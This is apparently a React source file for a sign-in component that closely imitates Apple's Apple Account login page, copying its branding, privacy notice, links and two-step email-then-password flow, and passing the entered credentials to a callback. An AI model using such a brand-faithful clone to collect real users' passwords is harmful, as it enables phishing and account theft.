import { useEffect, useRef, useState } from "react";
import { Landing } from "../components/Landing";

const PRIVACY_TEXT =
  "Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.";

function CheckIcon() {
  return (
    <svg viewBox="0 0 12 12" className="h-3 w-3" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M2 6.2 4.7 9 10 3.2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

export default function Login({ onContinue }) {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [focused, setFocused] = useState(false);
  const [pwdFocused, setPwdFocused] = useState(false);
  const [reserved, setReserved] = useState(0);

  const emailRef = useRef(null);
  const passwordRef = useRef(null);
  const contentRef = useRef(null);

  const emailStep = step === "email";
  const small = !emailStep || focused || email.length > 0;
  const complete = emailStep ? email.trim().length > 0 : password.length > 0;

  useEffect(() => {
    // Apple focuses the first field on pointer devices; on phones the keyboard stays closed.
    if (window.matchMedia("(min-width: 735px)").matches) {
      emailRef.current?.focus();
    }
  }, []);

  // The password field takes over the same card; focus it as the reference does.
  useEffect(() => {
    if (emailStep) return;
    const timer = setTimeout(() => passwordRef.current?.focus(), 80);
    return () => clearTimeout(timer);
  }, [emailStep]);

  function showPasswordStep() {
    // Reserve the height the email step currently occupies, so swapping the
    // privacy text for the password row does not make the card jump.
    const height = contentRef.current?.getBoundingClientRect().height ?? 0;
    setReserved(Math.ceil(height));
    setFocused(false);
    setStep("password");
  }

  function backToEmailStep() {
    setStep("email");
    setPassword("");
    setPwdFocused(false);
    setTimeout(() => emailRef.current?.focus(), 60);
  }

  function submit(event) {
    event.preventDefault();
    if (!complete) return;
    if (emailStep) {
      showPasswordStep();
      return;
    }
    onContinue?.(email.trim(), password);
  }

  return (
    <Landing>
      <div className="mb-[50px] flex min-h-[410px] justify-center">
        <div className="w-[min(460px,calc(90vw_-_10px))] pb-[5px] pt-[9px] max-[405px]:pb-[6px]">
          <h1 className="text-center font-display text-[24px] font-semibold leading-[28px] tracking-[0.216px] text-[#1d1d1f] min-[767px]:text-[28px] min-[767px]:leading-[32px] min-[767px]:tracking-[0.196px] min-[1069px]:text-[32px] min-[1069px]:leading-[36px] min-[1069px]:tracking-[0.128px]">
            Apple Account
          </h1>
          <p className="mt-3 text-center text-[17px] leading-[25px] tracking-[-0.374px] text-[#1d1d1f]">
            Manage your Apple Account
          </p>

          <form className="mt-[32px]" onSubmit={submit}>
            <div
              ref={contentRef}
              style={!emailStep && reserved ? { minHeight: `${reserved}px` } : undefined}
            >
              <div
                className="relative h-[56px] w-full"
                onClick={() => {
                  if (!emailStep) backToEmailStep();
                }}
              >
                <input
                  ref={emailRef}
                  type="text"
                  id="account_name_text_field"
                  enterKeyHint="done"
                  autoCorrect="off"
                  autoCapitalize="off"
                  spellCheck="false"
                  required
                  autoComplete="off"
                  aria-required="true"
                  aria-invalid="false"
                  aria-labelledby="apple_id_field_label"
                  value={email}
                  onChange={(event) => setEmail(event.target.value)}
                  onFocus={() => setFocused(true)}
                  onBlur={() => setFocused(false)}
                  className={`h-[56px] w-full rounded-[12px] border-solid bg-[rgba(255,255,255,0.8)] pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
                    !emailStep
                      ? "rounded-t-[12px] rounded-b-none border border-[#86868b] pl-4"
                      : focused
                        ? "rounded-[12px] border-2 border-[#0071e3] pl-[15px]"
                        : "rounded-[12px] border border-[#86868b] pl-4"
                  }`}
                />
                <span
                  id="apple_id_field_label"
                  aria-hidden="true"
                  className={`pointer-events-none absolute left-[17px] block overflow-hidden text-left text-[#6e6e73] transition-all duration-[125ms] ease-in ${
                    small
                      ? "top-[10px] text-[12px] leading-[16px] tracking-[-0.12px]"
                      : "top-[18px] text-[17px] leading-[21px] tracking-[-0.374px]"
                  }`}
                >
                  Email or Phone Number
                </span>
              </div>

              {!emailStep ? (
                <div className="animate-step-in">
                  <div className="relative h-[56px] w-full">
                    <input
                      ref={passwordRef}
                      type="password"
                      id="password_text_field"
                      enterKeyHint="go"
                      autoCorrect="off"
                      autoCapitalize="off"
                      spellCheck="false"
                      required
                      autoComplete="current-password"
                      aria-labelledby="password_field_label"
                      aria-invalid="false"
                      value={password}
                      onChange={(event) => setPassword(event.target.value)}
                      onFocus={() => setPwdFocused(true)}
                      onBlur={() => setPwdFocused(false)}
                      className={`h-[56px] w-full rounded-b-[12px] rounded-t-none border-solid bg-[rgba(255,255,255,0.8)] pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
                        pwdFocused
                          ? "border-2 border-[#0071e3] pl-[15px]"
                          : "border border-[#86868b] pl-4"
                      }`}
                    />
                    <span
                      id="password_field_label"
                      aria-hidden="true"
                      className="pointer-events-none absolute left-[17px] top-[10px] block overflow-hidden text-left text-[12px] leading-[16px] tracking-[-0.12px] text-[#6e6e73]"
                    >
                      Password
                    </span>
                  </div>

                  <div className="mt-3 flex h-5 items-start justify-between">
                    <label className="flex cursor-pointer items-start pt-px text-[14px] leading-[14px] tracking-[-0.224px] text-[#1d1d1f]">
                      <input
                        type="checkbox"
                        className="sr-only"
                        checked={remember}
                        onChange={(event) => setRemember(event.target.checked)}
                      />
                      <span
                        aria-hidden="true"
                        className={`mt-[2px] flex h-4 w-4 items-center justify-center rounded-[3px] border text-white transition-colors duration-150 ${
                          remember
                            ? "border-[#0071e3] bg-[#0071e3]"
                            : "border-[#86868b] bg-[rgba(255,255,255,0.8)]"
                        }`}
                      >
                        {remember ? <CheckIcon /> : null}
                      </span>
                      <span className="ml-[10px]">Remember me</span>
                    </label>

                    <a
                      href="https://iforgot.apple.com/password/verify/appleid"
                      target="_blank"
                      rel="noopener"
                      className="whitespace-nowrap text-[14px] leading-[20px] tracking-[-0.224px] text-[#0066cc] hover:underline"
                    >
                      Forgot password?
                      <svg
                        aria-hidden="true"
                        viewBox="0 0 12 12"
                        className="ml-[3px] inline-block h-[10px] w-[10px] align-[-1px]"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="1.2"
                      >
                        <path d="M3 9 9 3M4.2 3H9v4.8" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </a>
                  </div>
                </div>
              ) : null}

              {emailStep ? (
                <div className="mt-[44px]">
                  <div className="h-5 w-[26px] bg-[url('/assets/privacy-muted.svg')] bg-cover bg-center min-[767px]:h-[29px] min-[767px]:w-[37px]" />
                  <p className="mt-3 text-left text-[12px] leading-4 tracking-[-0.12px] text-[#1d1d1f]">
                    {PRIVACY_TEXT}{" "}
                    <a
                      href="https://www.apple.com/legal/privacy/data/en/apple-id/"
                      target="_blank"
                      rel="noopener"
                      className="text-[#0066cc]"
                    >
                      See&nbsp;how&nbsp;your&nbsp;data&nbsp;is&nbsp;managed...
                    </a>
                  </p>
                </div>
              ) : null}
            </div>

            <button
              type="submit"
              disabled={!complete}
              className="relative mt-[33px] block h-[38px] max-[405px]:mt-[32px] w-full rounded-[8px] border border-transparent bg-[#0071e3] px-[15px] py-[8px] text-center text-[14px] leading-[20px] tracking-[-0.224px] text-white transition-[background-color,transform] duration-150 ease-out hover:bg-[#0077ed] active:scale-[0.99] disabled:opacity-[0.42] disabled:hover:bg-[#0071e3]"
            >
              <span className="text-[14px] leading-[20px]">
                {emailStep ? "Continue" : "Sign In"}
              </span>
            </button>
          </form>
        </div>
      </div>
    </Landing>
  );
}
